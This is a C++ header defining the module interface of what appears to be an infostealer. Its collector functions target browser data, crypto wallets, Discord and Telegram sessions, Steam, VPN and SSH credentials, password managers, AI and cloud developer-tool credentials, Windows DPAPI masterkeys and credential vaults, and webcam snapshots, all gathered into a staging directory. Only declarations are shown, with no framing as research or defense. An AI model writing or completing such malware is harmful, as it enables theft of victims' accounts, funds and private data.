#pragma once
// Collector module interface. Each module writes its findings into the staging
// directory (one subdirectory per module) and appends a text summary line.
#include <cstdint>
#include <map>
#include <string>
#include <vector>

namespace stage {

// Global staging root, set once by main().
extern std::string g_root;
inline std::string dir() { return g_root; }
inline std::string sub(const std::string& name) { return g_root.empty() ? name : g_root + "\\" + name; }

// Summary lines shown in the text report (module -> lines)
extern std::map<std::string, std::vector<std::string>> g_summary;
void note(const std::string& module, const std::string& line);

// counters for the final stats block
extern unsigned long long g_bytes_staged;
extern int g_files_staged;
bool stage_bytes(const std::string& module, const std::string& name,
                 const std::vector<uint8_t>& data);
bool stage_text(const std::string& module, const std::string& name, const std::string& text);
bool stage_copy(const std::string& module, const std::string& src_file);

} // namespace stage

// ---- modules ----
namespace mod {

// browsers: Chromium family (all variants) + Gecko family (Firefox forks)
void browsers(const std::string& staging);
// crypto wallets: wallet files + browser extension vaults + telegram, etc.
void wallets(const std::string& staging);
// discord tokens (leveldb + dpapi-encrypted)
void discord(const std::string& staging);
// telegram desktop tdata
void telegram(const std::string& staging);
// steam accounts, configs, ssfn
void steam(const std::string& staging);
// game launchers: epic, minecraft, battle.net, origin/ea, uplay, riot, gog
void games(const std::string& staging);
// messengers: skype, signal, tox, pidgin, element, icq
void messengers(const std::string& staging);
// vpn clients: openvpn, nordvpn, protonvpn, wireguard, windscribe, openvpn connect
void vpn(const std::string& staging);
// ftp/ssh clients: filezilla, winscp, putty, ssh keys, totalcmd
void ftp_ssh(const std::string& staging);
// mail clients: thunderbird, outlook, postbox, em client
void mail(const std::string& staging);
// password managers: bitwarden, keepass, 1password, lastpass, dashlane, roboform
void pwmanagers(const std::string& staging);
// social apps: tiktok, instagram, twitter, tinder, telegram desktop sessions json
void socials(const std::string& staging);
// developer & AI tool credentials (claude/codex/cursor/copilot, cloud CLIs, histories, electron cookies)
void devtools(const std::string& staging);
// windows credential vaults: Credential Manager, DPAPI masterkeys, Vault, Recall
void vaults(const std::string& staging);
// targeted file grabber
void files(const std::string& staging);
// system info + screenshot + wifi + product key + processes + webcam snapshot
void system(const std::string& staging);

} // namespace mod
